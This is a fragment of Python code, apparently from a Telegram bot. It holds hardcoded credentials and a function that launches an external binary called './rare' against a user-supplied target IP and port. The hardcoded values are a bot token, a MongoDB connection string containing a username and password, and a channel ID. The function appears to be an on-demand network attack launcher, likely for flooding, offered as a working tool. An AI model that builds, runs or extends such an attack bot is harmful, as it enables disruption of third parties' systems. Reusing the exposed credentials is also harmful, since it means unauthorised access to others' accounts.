...
TOKEN = '7447089126:AAEfFYR_UJdA8sn4XWZNBvL8KdhJEG0TUbA'
MONGO_URI = 'mongodb+srv://rareowner:rareowner@rareowner.q3rdy.mongodb.net/?retryWrites=true&w=majority&appName=rareowner'
CHANNEL_ID = -1002421398060
...
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./rare", target_ip, str(target_port), "1", "150"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
